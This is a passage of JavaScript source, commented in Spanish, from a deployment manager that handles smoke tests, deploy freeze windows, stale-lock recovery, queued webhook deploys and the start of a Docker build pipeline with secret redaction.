            ok: false,
            status: null,
            latencyMs,
            attempts: attempt,
            error: msg
          };
        }

        if (attempt <= retries) {
          await new Promise((r) => {
            const t = setTimeout(r, 150);
            if (t.unref) t.unref();
          });
        }
      }

      if (lastResult && lastResult.ok) passed++;
      else failed++;
      results.push(lastResult);
    }

    const durationMs = Date.now() - started;
    const ok = failed === 0;
    const summary = ok
      ? `Smoke tests superados (${passed}/${results.length} en ${durationMs} ms)`
      : `Smoke tests fallidos (${failed}/${results.length} fallaron)`;
    return { ok, passed, failed, total: results.length, durationMs, checks: results, summary };
  }

  /** Ejecuta los smoke tests configurados de un proyecto contra su contenedor activo (`state.current`). */
  async runSmokeTestsForProject(projectId, options = {}) {
    const state = this.getState(projectId);
    const current = state.current;
    if (!current || (!current.hostPort && !current.containerName)) {
      return { ok: false, status: 404, error: 'No hay ningún despliegue activo para ejecutar smoke tests' };
    }
    const pm = getProjectManager();
    const project = options.project || (pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null);
    const smokeCfg = normalizeSmokeConfig(options.smokeTests !== undefined ? options.smokeTests : (project && project.smokeTests));
    if (smokeCfg.checks.length === 0) {
      return { ok: true, passed: 0, failed: 0, total: 0, durationMs: 0, checks: [], summary: 'Sin smoke tests configurados' };
    }
    const serverId = current.serverId || (project && project.serverId) || 'local';
    const secrets = this._secretValuesForProject(projectId);
    const hostHeader = options.hostHeader || (Array.isArray(current.hostnames) && current.hostnames[0]) || null;

    if (serverId !== 'local') {
      return this._withRemoteDockerEnv(serverId, {}, async (_dh, fleet) =>
        this._withHealthTarget(serverId, fleet, current.hostPort, (localPort) =>
          this.runSmokeTests(`127.0.0.1:${localPort}`, smokeCfg.checks, { hostHeader, secrets })
        )
      );
    }
    return this.runSmokeTests(
      { hostPort: current.hostPort, containerName: current.containerName, containerPort: current.containerPort, isRemote: false },
      smokeCfg.checks,
      { hostHeader, secrets }
    );
  }

  // -------------------------------------------------------------------------
  // 5. Despliegue
  // -------------------------------------------------------------------------

  /** Hostnames públicos del proyecto, en el orden en que deben registrarse. */
  hostnamesFor(project) {
    const raw = Array.isArray(project.domains) ? project.domains : [];
    const clean = raw
      .map(d => String(typeof d === 'string' ? d : (d && d.hostname) || '').trim().toLowerCase())
      .filter(d => /^(\*\.)?([a-z0-9]([a-z0-9-]*[a-z0-9])?\.)+[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(d));
    return Array.from(new Set(clean));
  }

  /** Serializa despliegues del mismo proyecto: dos a la vez es corrupción segura. */
  async deploy(project, options = {}) {
    if (!project || !project.id) throw new Error('Proyecto inválido');

    // Guardia pre-despliegue anti-ENOSPC (Cosmos#591): impedir corromper capas o estado si falta espacio
    if (!options.skipDiskCheck) {
      const minFree = options.minFreeBytes !== undefined
        ? Number(options.minFreeBytes)
        : (process.env.CULKIBO_MIN_FREE_BYTES != null ? Number(process.env.CULKIBO_MIN_FREE_BYTES) : DEFAULT_MIN_DISK_FREE_BYTES);
      assertDiskHeadroom(DATA_DIR, minFree);
    }

    // Ventanas de congelación de despliegues (nunca bloquean rollback; overrideFreeze queda auditado).
    const freezeTrigger = options.trigger || 'manual';
    const freezeNow = options.now !== undefined ? new Date(options.now) : new Date();
    const freezeCheck = this.evaluateFreezeStatus(project, { now: freezeNow, trigger: freezeTrigger });
    /** @type {any} */
    let freezeOverrideMeta = null;
    if (freezeCheck.frozen) {
      if (!options.overrideFreeze) {
        this._recordAudit({
          source: options.auditSource || 'system',
          action: 'deploy.freeze_blocked',
          resourceId: project.id,
          ip: options.actorIp || null,
          status: 423,
          detail: {
            projectName: project.name || project.id,
            trigger: freezeTrigger,
            reason: freezeCheck.reason,
            window: freezeCheck.window
          }
        });
        this.emit('deploy_freeze_blocked', {
          projectId: project.id,
          trigger: freezeTrigger,
          reason: freezeCheck.reason,
          window: freezeCheck.window
        });
        const err = new Error(`Despliegue bloqueado por ventana de congelación: ${freezeCheck.reason || 'ventana activa'}`);
        /** @type {any} */ (err).code = 'DEPLOY_FROZEN';
        /** @type {any} */ (err).status = 423;
        /** @type {any} */ (err).freezeWindow = freezeCheck.window;
        throw err;
      }
      freezeOverrideMeta = {
        overridden: true,
        actor: String(options.actor || 'operator').slice(0, 120),
        overrideReason: String(options.overrideReason || '').slice(0, 300),
        window: freezeCheck.window,
        at: freezeNow.toISOString()
      };
      this._recordAudit({
        source: options.auditSource || 'system',
        action: 'deploy.freeze_override',
        resourceId: project.id,
        ip: options.actorIp || null,
        status: 200,
        detail: {
          projectName: project.name || project.id,
          trigger: freezeTrigger,
          actor: freezeOverrideMeta.actor,
          overrideReason: freezeOverrideMeta.overrideReason,
          window: freezeCheck.window
        }
      });
      this.notify({
        event: 'deploy_freeze_override',
        level: 'warning',
        title: 'Anulación de congelación de despliegues',
        message: `${project.name || project.id}: despliegue forzado durante ventana de congelación por ${freezeOverrideMeta.actor}${freezeOverrideMeta.overrideReason ? ` (${freezeOverrideMeta.overrideReason})` : ''}.`,
        projectId: project.id,
        projectName: project.name || project.id
      });
    }

    const reapCheck = this.reapStaleDeployLock(project.id);
    const inFlight = this.locks.get(project.id);
    if (inFlight && !reapCheck.reaped) {
      throw new Error('Ya hay un despliegue en curso para este proyecto');
    }
    const lockOwner = `dep_${crypto.randomBytes(6).toString('hex')}`;
    const lockNow = Date.now();
    const lockTtlMs = sanitizeBoundedInt(options.lockTtlMs, DEPLOY_LOCK_DEFAULT_TTL_MS, 5000, 24 * 60 * 60 * 1000);
    const deployOpts = freezeOverrideMeta ? { ...options, _freezeOverride: freezeOverrideMeta } : options;
    const task = this._deploy(project, deployOpts).finally(() => {
      if (this.locks.get(project.id) === task) {
        this.locks.delete(project.id);
        this._lockMeta.delete(project.id);
      }
      this.drainPending(project.id);
    });
    this.locks.set(project.id, task);
    this._lockMeta.set(project.id, {
      projectId: project.id,
      ownerId: lockOwner,
      pid: process.pid,
      acquiredAt: lockNow,
      expiresAt: lockNow + lockTtlMs,
      ttlMs: lockTtlMs
    });
    return task;
  }

  /**
   * Resuelve la ruta del archivo de lock para un proyecto dentro de un directorio dado.
   * @param {string} projectId
   * @param {string | null} [lockDir]
   * @returns {string | null}
   */
  _resolveLockFile(projectId, lockDir = null) {
    const dir = lockDir || this._lockDir || null;
    if (!dir) return null;
    const slug = safeSlug(projectId);
    return path.join(path.resolve(dir), `${slug}.lock.json`);
  }

  /**
   * Detecta y libera automáticamente bloqueos de despliegue obsoletos por PID muerto
   * (`process.kill(pid, 0)` → `ESRCH`) o TTL vencido (cura deadlocks tras OOM/crash tipo Dokploy BullMQ).
   *
   * @param {string} projectId
   * @param {{ nowMs?: number, lockDir?: string | null, isPidAlive?: (pid: number) => boolean }} [opts]
   */
  reapStaleDeployLock(projectId, opts = {}) {
    if (!projectId || typeof projectId !== 'string') {
      return { reaped: false, active: false, reason: null, staleLock: null, lock: null };
    }
    const nowMs = opts.nowMs != null ? Number(opts.nowMs) : Date.now();
    const checkPid = typeof opts.isPidAlive === 'function' ? opts.isPidAlive : isPidAlive;
    const lockFile = this._resolveLockFile(projectId, opts.lockDir);

    /** @type {any} */
    let meta = this._lockMeta.get(projectId) || null;
    let fromDisk = false;
    if (!meta && lockFile && fs.existsSync(lockFile)) {
      try {
        meta = JSON.parse(fs.readFileSync(lockFile, 'utf8'));
        fromDisk = true;
      } catch (e) {
        try { fs.unlinkSync(lockFile); } catch (_) {}
        return { reaped: true, active: false, reason: 'corrupt_lockfile', staleLock: null, lock: null };
      }
    }

    if (!meta) {
      return { reaped: false, active: this.locks.has(projectId), reason: null, staleLock: null, lock: null };
    }

    /** @type {'dead_pid' | 'ttl_expired' | null} */
    let staleReason = null;
    if (Number.isInteger(Number(meta.pid)) && Number(meta.pid) > 0 && !checkPid(Number(meta.pid))) {
      staleReason = 'dead_pid';
    } else if (meta.expiresAt != null && Number.isFinite(Number(meta.expiresAt)) && nowMs >= Number(meta.expiresAt)) {
      staleReason = 'ttl_expired';
    }

    if (staleReason) {
      this._lockMeta.delete(projectId);
      this.locks.delete(projectId);
      if (lockFile && fs.existsSync(lockFile)) {
        try { fs.unlinkSync(lockFile); } catch (e) {}
      }
      this.emit('stale_lock_reaped', {
        projectId,
        reason: staleReason,
        fromDisk,
        staleLock: meta,
        reapedAt: new Date(nowMs).toISOString()
      });
      return { reaped: true, active: false, reason: staleReason, staleLock: meta, lock: null };
    }

    return { reaped: false, active: true, reason: null, staleLock: null, lock: meta };
  }

  /**
   * Adquiere el bloqueo de despliegue por proyecto con auto-recuperación previa de locks huérfanos.
   *
   * @param {string} projectId
   * @param {{
   *   ownerId?: string,
   *   pid?: number,
   *   ttlMs?: number,
   *   nowMs?: number,
   *   lockDir?: string | null,
   *   persistLock?: boolean,
   *   task?: any,
   *   isPidAlive?: (pid: number) => boolean
   * }} [opts]
   */
  acquireDeployLock(projectId, opts = {}) {
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    const nowMs = opts.nowMs != null ? Number(opts.nowMs) : Date.now();
    const ttlMs = sanitizeBoundedInt(opts.ttlMs, DEPLOY_LOCK_DEFAULT_TTL_MS, 1000, 24 * 60 * 60 * 1000);
    const reap = this.reapStaleDeployLock(projectId, {
      nowMs,
      lockDir: opts.lockDir,
      isPidAlive: opts.isPidAlive
    });

    if (reap.active || this.locks.has(projectId)) {
      /** @type {any} */
      const err = new Error('Ya hay un despliegue en curso para este proyecto');
      err.code = 'DEPLOY_LOCKED';
      err.status = 409;
      err.lock = reap.lock || this._lockMeta.get(projectId) || null;
      throw err;
    }

    const ownerId = String(opts.ownerId || `lk_${crypto.randomBytes(8).toString('hex')}`);
    const pid = Number.isInteger(Number(opts.pid)) && Number(opts.pid) > 0 ? Number(opts.pid) : process.pid;
    const record = {
      projectId,
      ownerId,
      pid,
      acquiredAt: nowMs,
      expiresAt: nowMs + ttlMs,
      ttlMs
    };
    this._lockMeta.set(projectId, record);
    this.locks.set(projectId, opts.task || { ownerId, pid, acquiredAt: nowMs });

    const lockFile = this._resolveLockFile(projectId, opts.lockDir);
    if (lockFile && (opts.lockDir || opts.persistLock || this._lockDir)) {
      fs.mkdirSync(path.dirname(lockFile), { recursive: true });
      atomicWriteJsonSync(lockFile, record);
    }

    return {
      acquired: true,
      ownerId,
      pid,
      acquiredAt: nowMs,
      expiresAt: record.expiresAt,
      reapedStale: Boolean(reap.reaped),
      reapedReason: reap.reason || null
    };
  }

  /**
   * Libera el bloqueo de despliegue de un proyecto (verificando `ownerId` si se aporta).
   * @param {string} projectId
   * @param {string | null} [ownerId]
   * @param {{ lockDir?: string | null }} [opts]
   */
  releaseDeployLock(projectId, ownerId = null, opts = {}) {
    const current = this._lockMeta.get(projectId);
    if (ownerId && current && current.ownerId !== ownerId) {
      return { released: false, reason: 'owner_mismatch' };
    }
    this._lockMeta.delete(projectId);
    if (!ownerId || !current || current.ownerId === ownerId) {
      this.locks.delete(projectId);
    }
    const lockFile = this._resolveLockFile(projectId, opts.lockDir);
    if (lockFile && fs.existsSync(lockFile)) {
      try {
        if (ownerId) {
          const onDisk = JSON.parse(fs.readFileSync(lockFile, 'utf8'));
          if (onDisk && onDisk.ownerId && onDisk.ownerId !== ownerId) {
            return { released: false, reason: 'owner_mismatch' };
          }
        }
        fs.unlinkSync(lockFile);
      } catch (e) {}
    }
    return { released: true };
  }

  /**
   * Como `deploy()`, pero si ya hay uno en curso lo deja encolado en vez de
   * fallar.
   *
   * Existe por el webhook: durante un build de varios minutos es normal que
   * lleguen más pushes, y rechazarlos deja la rama desplegada por detrás del
   * repositorio sin que nadie se entere. Rechazar es correcto para un botón
   * («ya hay uno en curso», el usuario lo ve); para un disparo automático no lo
   * es.
   *
   * @returns {{started: boolean, queued: boolean, blocked?: boolean, code?: string, window?: any, reason?: string | null, promise?: Promise<any>}}
   */
  enqueue(project, options = {}) {
    if (!project || !project.id) throw new Error('Proyecto inválido');

    // Guardia pre-despliegue anti-ENOSPC (Cosmos#591): impedir corromper capas o estado si falta espacio
    if (!options.skipDiskCheck) {
      const minFree = options.minFreeBytes !== undefined
        ? Number(options.minFreeBytes)
        : (process.env.CULKIBO_MIN_FREE_BYTES != null ? Number(process.env.CULKIBO_MIN_FREE_BYTES) : DEFAULT_MIN_DISK_FREE_BYTES);
      assertDiskHeadroom(DATA_DIR, minFree);
    }
    const freezeTrigger = options.trigger || 'manual';
    const freezeNow = options.now !== undefined ? new Date(options.now) : new Date();
    const freezeCheck = this.evaluateFreezeStatus(project, { now: freezeNow, trigger: freezeTrigger });
    if (freezeCheck.frozen && !options.overrideFreeze) {
      this._recordAudit({
        source: options.auditSource || 'system',
        action: 'deploy.freeze_blocked',
        resourceId: project.id,
        ip: options.actorIp || null,
        status: 423,
        detail: {
          projectName: project.name || project.id,
          trigger: freezeTrigger,
          reason: freezeCheck.reason,
          window: freezeCheck.window
        }
      });
      this.emit('deploy_freeze_blocked', {
        projectId: project.id,
        trigger: freezeTrigger,
        reason: freezeCheck.reason,
        window: freezeCheck.window
      });
      return {
        started: false,
        queued: false,
        blocked: true,
        code: 'DEPLOY_FROZEN',
        window: freezeCheck.window,
        reason: freezeCheck.reason
      };
    }
    this.reapStaleDeployLock(project.id);
    if (this.locks.has(project.id)) {
      this.pending.set(project.id, { project, options });
      return { started: false, queued: true };
    }
    const promise = this.deploy(project, options);
    promise.catch(() => {});
    return { started: true, queued: false, promise };
  }

  /** Lanza el despliegue que quedó en espera, leyendo el Project más reciente de disco/memoria. */
  drainPending(projectId) {
    const next = this.pending.get(projectId);
    if (!next) return;
    this.pending.delete(projectId);
    if (this.locks.has(projectId)) return; // otro se adelantó; el suyo drenará
    let latestProject = next.project;
    try {
      const pm = getProjectManager();
      const fresh = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
      if (fresh) latestProject = fresh;
    } catch (e) {}
    const freezeCheck = this.evaluateFreezeStatus(latestProject, { trigger: next.options?.trigger || 'manual' });
    if (freezeCheck.frozen && !next.options?.overrideFreeze) {
      this.emit('deploy_freeze_blocked', {
        projectId,
        trigger: next.options?.trigger || 'manual',
        reason: freezeCheck.reason,
        window: freezeCheck.window
      });
      return;
    }
    const promise = this.deploy(latestProject, next.options);
    promise.catch(() => {});
  }

  async _deploy(project, options = {}) {
    this._abortedProjects.delete(project.id);
    const opts = { ...DEFAULTS, ...options };
    const state = this.getState(project.id);
    const slug = safeSlug(project.id);
    const serverId = String(options.serverId || project.serverId || 'local').trim() || 'local';
    if (!/^[a-z0-9_-]{1,64}$/.test(serverId)) {
      throw new Error(`serverId inválido: ${serverId.slice(0, 40)}`);
    }
    const isRemote = serverId !== 'local';
    const version = options.version
      ? safeSlug(options.version, 'v')
      : `b${Date.now().toString(36)}`;

    const linkedDb = this.resolveLinkedDatabases(project);
    // Las variables explícitas del proyecto prevalecen sobre las autoinyectadas de BDs vinculadas.
    let envVars = { ...linkedDb.injectedEnv, ...(project.envVars || {}) };
    const vaultSecrets = [];
    if (Object.values(envVars).some((v) => typeof v === 'string' && v.includes('${vault.'))) {
      const envMgr = getEnvironmentManager();
      if (envMgr && typeof envMgr.resolveEnvWithVault === 'function') {
        try {
          const resolved = envMgr.resolveEnvWithVault(envVars);
          if (resolved && typeof resolved === 'object') {
            const nextMap = resolved.env && typeof resolved.env === 'object' ? resolved.env : resolved;
            for (const [k, v] of Object.entries(nextMap)) {
              if (envVars[k] !== v && typeof v === 'string' && v.length >= 8) vaultSecrets.push(v);
            }
            envVars = nextMap;
          }
        } catch (e) {}
      }
    }
    const envNames = Object.keys(envVars).filter(isValidEnvName);
    const rejectedEnv = Object.keys(envVars).filter(k => !isValidEnvName(k));

    const suffix = crypto.randomBytes(3).toString('hex');
    const preassignedId = options.deploymentId || `dep_${Date.now()}_${suffix}`;
    /** @type {any} */
    const deployment = {
      id: preassignedId,
      projectId: project.id,
      projectName: project.name || project.id,
      serverId,
      status: 'pendiente',
      imageTag: `culkibo/${slug}:${version}`,
      // Sufijo aleatorio: evita colisiones si el usuario redespliega la misma `version`
      // y garantiza que `forceRemove` jamás pueda tocar el contenedor activo.
      containerName: `culkibo_${slug}_${version}_${suffix}`,
      hostPort: null,
      containerPort: null,
      upstream: null,
      hostnames: this.hostnamesFor(project),
      routeSwitched: false,
      strategy: null,
      /** Qué código es esto exactamente. Lo rellena la sincronización con git. */
      git: null,
      trigger: options.trigger || 'manual',
      ...(options._freezeOverride ? { freezeOverride: options._freezeOverride } : {}),
      smokeTestResults: null,
      canaryResult: null,
      phaseTimings: {},
      previous: state.current ? { ...state.current } : null,
      startedAt: new Date().toISOString(),
      finishedAt: null,
      durationMs: null,
      error: null,
      logLines: []
    };
    const buildSecretsMap = {
      ...(project.buildSecrets && typeof project.buildSecrets === 'object' ? project.buildSecrets : {}),
      ...(options.buildSecrets && typeof options.buildSecrets === 'object' ? options.buildSecrets : {})
    };
    // No se persiste: solo sirve para redactar la salida en vivo (envVars + buildArgs + buildSecrets + BDs vinculadas + vault).
    const allSecretValues = [
      ...Object.values(envVars),
      ...Object.values(project.buildArgs || {}),
      ...Object.values(buildSecretsMap),
      ...linkedDb.secretValues,
      ...vaultSecrets
    ];
    Object.defineProperty(deployment, '__secrets', { value: allSecretValues, enumerable: false });

    const opController = new AbortController();
    const activeOp = {
      deploymentId: deployment.id,
      stage: 'pendiente',
      controller: opController,
      children: new Set(),
      containerName: deployment.containerName
    };
    this._activeOps.set(project.id, activeOp);

    state.history.unshift(deployment);
    if (state.history.length > 20) state.history.pop();

    const started = Date.now();
    /** @type {{ name: string, startedAtMs: number } | null} */
    let currentPhase = null;
    const closeCurrentPhase = (nowMs = Date.now()) => {
      if (!currentPhase) return;
      const entry = deployment.phaseTimings[currentPhase.name];
      if (entry && entry.finishedAt === null) {
        entry.finishedAt = new Date(nowMs).toISOString();
        entry.durationMs = Math.max(0, nowMs - currentPhase.startedAtMs);
      }
      currentPhase = null;
    };
    const setStage = (stage) => {
      const nowMs = Date.now();
      if (!currentPhase || currentPhase.name !== stage) {
        closeCurrentPhase(nowMs);
        if (NON_TERMINAL_STATUSES.has(stage)) {
          deployment.phaseTimings[stage] = {
            startedAt: new Date(nowMs).toISOString(),
            finishedAt: null,
            durationMs: null
          };
          currentPhase = { name: stage, startedAtMs: nowMs };
        }
      }
      activeOp.stage = stage;
      this.setStatus(deployment, stage);
    };
    /** @param {string} status @param {string | null} [error] */
    const finish = (status, error = null) => {
      deployment.finishedAt = new Date().toISOString();
      deployment.durationMs = Date.now() - started;
      deployment.error = error;
      setStage(status);
      this.saveStore();
      if (status === 'fallido' && !deployment.__failNotified) {
        deployment.__failNotified = true;
        this.notify({
          event: 'deploy_failed',
          level: 'error',
          title: 'Despliegue fallido',
          message: `${deployment.projectName}: ${String(error || 'error desconocido').slice(0, 600)}`,
          projectId: project.id,
          projectName: deployment.projectName
        });
      }
      try {
        const ts = require('./telemetryService');
        const stackKind = deployment.strategy?.stack || deployment.strategy?.builder || 'unknown';
        ts.recordFeatureUsage(`deploy:${stackKind}`, status === 'activo');
        if (status === 'fallido') {
          ts.captureOperationFailure({
            operation: 'deploy',
            stage: activeOp.stage || 'deploy',
            kind: stackKind,
            message: String(error || 'deploy_failed'),
            durationMs: deployment.durationMs
          });
        }
      } catch (e) {}
      return deployment;
    };

    // Validar hooks pre/post despliegue antes de empezar (fail-fast sin desperdiciar build)
    /** @type {string[] | null} */
    let preHookArgv = null;
    /** @type {string[] | null} */
    let postHookArgv = null;
    if (!options.skipHooks) {
      try {
        if (project.preDeployCommand && String(project.preDeployCommand).trim()) {
          preHookArgv = parseSafeCommandArgv(project.preDeployCommand);
        }
        if (project.postDeployCommand && String(project.postDeployCommand).trim()) {
          postHookArgv = parseSafeCommandArgv(project.postDeployCommand);
        }
      } catch (hookErr) {
        this.log(deployment, 'ERROR', `Hook pre/post despliegue inválido: ${hookErr.message}`);
        this._activeOps.delete(project.id);
        return finish('fallido', `Hook inválido: ${hookErr.message}`);
      }
    }

    // Preflight específico para nodos remotos (Fleet SSH): cordón de mantenimiento/drenaje, bind mounts locales y BDs locales privadas
    if (isRemote) {
      const fleetCheck = typeof this._getFleetManager === 'function' ? this._getFleetManager() : getServerFleetManager();
      if (fleetCheck) {
        /** @type {any} */
        let srv = null;
        try {
          if (typeof fleetCheck.getServer === 'function') srv = fleetCheck.getServer(serverId);
          else if (typeof fleetCheck.listServers === 'function') {
            srv = (fleetCheck.listServers() || []).find((s) => s && s.id === serverId) || null;
          }
        } catch (e) {}
        if (srv && srv.maintenanceState && srv.maintenanceState !== 'active') {
          const msg = `El nodo remoto «${serverId}» está en modo «${srv.maintenanceState}» y no admite nuevos despliegues.`;
          deployment.errorCode = 'SERVER_MAINTENANCE';
          this.log(deployment, 'ERROR', msg);
          this._activeOps.delete(project.id);
          return finish('fallido', msg);
        }
      }
      const hostBindMounts = [
        ...(Array.isArray(project.volumes) ? project.volumes.filter((v) => typeof v === 'string' && (/^[./\\]|^[A-Za-z]:/.test(v.split(':')[0] || ''))) : []),
        ...(Array.isArray(project.fileMounts) ? project.fileMounts.filter(Boolean) : [])
      ];
      if (hostBindMounts.length > 0) {
        const msg = `El nodo remoto «${serverId}» no admite montajes locales del host (volumes/fileMounts). Usa volúmenes nombrados de Docker.`;
        this.log(deployment, 'ERROR', msg);
        this._activeOps.delete(project.id);
        return finish('fallido', msg);
      }
      if (linkedDb.networks.length > 0) {
        const msg = `El nodo remoto «${serverId}» no puede conectarse a redes privadas de bases de datos locales (${linkedDb.linkedNames.join(', ')}). Configura DATABASE_URL accesible desde el nodo remoto.`;
        this.log(deployment, 'ERROR', msg);
        this._activeOps.delete(project.id);
        return finish('fallido', msg);
      }
    }

    this.notify({
      event: 'deploy_started',
      level: 'info',
      title: 'Despliegue iniciado',
      message: `${deployment.projectName}: iniciando despliegue (${deployment.trigger})${isRemote ? ` en nodo «${serverId}»` : ''}.`,
      projectId: project.id,
      projectName: deployment.projectName
    });

    /** @type {any} */
    let activeDockerEnv = undefined;
    try {
      return await this._withRemoteDockerEnv(serverId, { signal: opController.signal }, async (remoteDockerHost, fleet) => {
        const dockerBaseEnv = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
        activeDockerEnv = dockerBaseEnv;
        if (isRemote) {
          this.log(deployment, 'INFO', `Túnel SSH Docker adquirido para nodo remoto «${serverId}»`);
        }

        // --- 0. Requisitos --------------------------------------------------
        const docker = await this.detectDocker({ force: true, env: dockerBaseEnv });
        if (!docker.available) {
          this.log(deployment, 'ERROR', `No se puede desplegar: ${docker.reason}.`);
          return finish('fallido', docker.reason);
        }

        // Guardia anti-ENOSPC antes de iniciar el build (solo en local; configurable vía CULKIBO_MIN_FREE_DISK_MB)
        if (!isRemote && !options.skipDiskCheck && process.env.NODE_ENV !== 'test' && typeof fs.statfsSync === 'function') {
          try {
            const minFreeMb = Math.max(0, Number(process.env.CULKIBO_MIN_FREE_DISK_MB ?? 1024));
            if (minFreeMb > 0) {
              const st = fs.statfsSync(DATA_DIR);
              const freeMb = Math.round((st.bavail * st.bsize) / (1024 * 1024));
              if (freeMb < minFreeMb) {
                const msg = `Espacio en disco insuficiente (${freeMb} MB libres; mínimo requerido ${minFreeMb} MB). Limpia la caché de BuildKit desde Ajustes → Doctor antes de desplegar.`;
                this.log(deployment, 'ERROR', msg);
                return finish('fallido', msg);
              }
            }
          } catch (e) {}
        }

        const rootContextDir = options.contextDir
          || (project.localPath && fs.existsSync(project.localPath) ? project.localPath : path.join(ROOT_BASE_DIR, 'projects', project.id));

        // --- 0.5. Código fuente ---------------------------------------------
        if (!options.contextDir && options.gitSync !== false && !project.localPath) {
          setStage('sincronizando');
          // Si localRunner está clonando este proyecto en paralelo tras POST /projects, esperar a que termine
          try {
            const localRunner = require('./localRunner');
            const pendingClone = localRunner && localRunner.cloningLocks && localRunner.cloningLocks.get(project.id);
            if (pendingClone) {
              this.log(deployment, 'INFO', 'Esperando a que finalice la clonación inicial en curso...');
              await pendingClone.catch(() => {});
            }
          } catch (e) {}

          const sync = await repoSync.sync(project, {
            commit: options.commit || null,
            signal: opController.signal,
            onLine: (line) => this.log(deployment, 'INFO', line)
          });

          if (sync.aborted || opController.signal.aborted || this._abortedProjects.has(project.id)) {
            this.log(deployment, 'WARN', 'Despliegue cancelado durante la sincronización Git');
            return finish('cancelado', 'Despliegue cancelado');
          }
          if (!sync.ok) {
            this.log(deployment, 'ERROR', `No se pudo obtener el código: ${sync.error}`);
            return finish('fallido', sync.error);
          }

          deployment.git = {
            branch: sync.branch,
            commit: sync.commit,
            shortCommit: sync.shortCommit,
            subject: sync.subject,
            author: sync.author,
            committedAt: sync.committedAt || null,
            action: sync.action,
            previousCommit: sync.previousCommit,
            discardedChanges: (sync.dirtyFiles || []).length
          };

          if (sync.action === 'omitido') {
            this.log(deployment, 'WARN', sync.reason);
          } else {
            const verb = sync.action === 'clonado'
              ? 'Repositorio clonado'
              : sync.action === 'sin-cambios'
                ? 'El repositorio ya estaba al día'
                : 'Repositorio actualizado';
            this.log(
              deployment,
              'INFO',
              `${verb}: ${sync.shortCommit} en «${sync.branch}»${sync.subject ? ` — ${sync.subject}` : ''}${sync.author ? ` (${sync.author})` : ''}`
            );
          }
        }

        // Resolver contexto: si `baseDirectory` apunta a un paquete de monorepo, mantener
        // la raíz del monorepo como contexto Docker para preservar lockfiles y `packages/*`.
        let contextDir = rootContextDir;
        /** @type {any} */
        let monorepoCtx = null;
        if (!options.contextDir && project.baseDirectory && project.baseDirectory !== '/' && project.baseDirectory !== '.') {
          monorepoCtx = this.detectMonorepoContext(rootContextDir, project.baseDirectory);
          if (!monorepoCtx) {
            try {
              contextDir = assertContainedPath(rootContextDir, String(project.baseDirectory).replace(/^\/+/, ''));
            } catch (e) {
              this.log(deployment, 'WARN', `baseDirectory inválido ignorado (${project.baseDirectory}): ${e.message}`);
            }
          }
        }

        if (!fs.existsSync(contextDir)) {
          const msg = `No hay código en ${contextDir}. Clona el repositorio del proyecto antes de desplegar.`;
          this.log(deployment, 'ERROR', msg);
          return finish('fallido', msg);
        }

        if (rejectedEnv.length > 0) {
          this.log(deployment, 'WARN', `Variables de entorno ignoradas por nombre inválido: ${rejectedEnv.join(', ')}`);
        }

        // --- 1. Estrategia --------------------------------------------------
        const strategy = await this.detectStrategy(contextDir, project, {
          isRemote,
          workspacePath: monorepoCtx ? monorepoCtx.workspacePath : null,
          workspaceTool: monorepoCtx ? monorepoCtx.workspaceTool : null,
          workspacePackageName: monorepoCtx ? monorepoCtx.workspacePackageName : null
        });
        deployment.strategy = {
          builder: strategy.builder,
          stack: strategy.stack,
          containerPort: strategy.containerPort,
          healthPath: strategy.healthPath,
          reason: strategy.reason
        };
        deployment.containerPort = strategy.containerPort;
        this.log(deployment, 'INFO', `Estrategia de construcción: ${strategy.reason}`);

        if (strategy.builder === 'generated' && strategy.stack === 'desconocido') {
          const msg = 'No se ha podido determinar cómo construir este proyecto. Añade un Dockerfile al repositorio o instala railpack.';
          this.log(deployment, 'ERROR', msg);
          return finish('fallido', msg);
        }

        // --- 2. Construcción (protegida por semáforo global de concurrencia) ---
        if (this._activeBuilds >= this.maxConcurrentBuilds) {
          setStage('en_cola');
          this.log(
            deployment,
            'INFO',
            `Esperando turno en la cola de builds (${this._activeBuilds}/${this.maxConcurrentBuilds} en curso para proteger la RAM del host)`
          );
        }
        let slot;
        try {
          slot = await this.acquireBuildSlot(project.id, deployment.id, { signal: opController.signal });
        } catch (slotErr) {
          if (slotErr && slotErr.code === 'DEPLOY_CANCELLED') {
            this.log(deployment, 'WARN', slotErr.message);
            return finish('cancelado', slotErr.message);
          }
          throw slotErr;
        }
        if (slot.waited) {
          this.log(deployment, 'INFO', `Turno de construcción adquirido tras cola (posición ${slot.position})`);
        }
        let buildOk;
        try {
          if (opController.signal.aborted || this._abortedProjects.has(project.id)) {
            this.log(deployment, 'WARN', 'Despliegue cancelado antes de iniciar la construcción');
            return finish('cancelado', 'Despliegue cancelado');
          }
          setStage('construyendo');
          buildOk = await this.runBuild(deployment, {
            strategy,
            contextDir,
            project,
            opts,
            envVars,
            signal: opController.signal,
            remoteDockerHost
          });
        } finally {
          this.releaseBuildSlot();
        }
        if (opController.signal.aborted || this._abortedProjects.has(project.id)) {
          this.log(deployment, 'WARN', 'Despliegue cancelado durante la construcción');
          return finish('cancelado', 'Despliegue cancelado');
        }
        if (!buildOk.ok) return finish('fallido', buildOk.error);

        // Precedencia correcta de memoria: options.memoryMb explícito > project.memoryMb > DEFAULTS.memoryMb
        const rawMem = options.memoryMb != null ? Number(options.memoryMb) : Number(project.memoryMb);
        const safeMemMb = Number.isInteger(rawMem) && rawMem >= 32 && rawMem <= 65536 ? rawMem : opts.memoryMb;
        const safeCpus = /^[0-9]+(\.[0-9]+)?$/.test(String(project.cpus || '')) ? String(project.cpus) : opts.cpus;

        // Preparar paso de variables de entorno: preferir `-e KEY` en memoria (conserva PEM multilínea
        // y no escribe secretos en disco), usando `--env-file` solo para claves en HOST_HIJACK_ENV_BLOCKLIST.
        // CRÍTICO: `DOCKER_HOST` del túnel remoto se inyecta DESPUÉS de `filterSafeHostEnv(envVars)` para que
        // ninguna variable del usuario pueda secuestrar `DOCKER_HOST`.
        const inlineEnvNames = envNames.filter((k) => !HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
        const fileOnlyEnvNames = envNames.filter((k) => HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
        const childRunEnv = {
          ...process.env,
          ...filterSafeHostEnv(envVars),
          ...(remoteDockerHost ? { DOCKER_HOST: remoteDockerHost } : {})
        };

        // --- 2.5. Hook pre-deploy (ej. migraciones Prisma/Drizzle antes de arrancar tráfico) ---
        if (preHookArgv && preHookArgv.length > 0) {
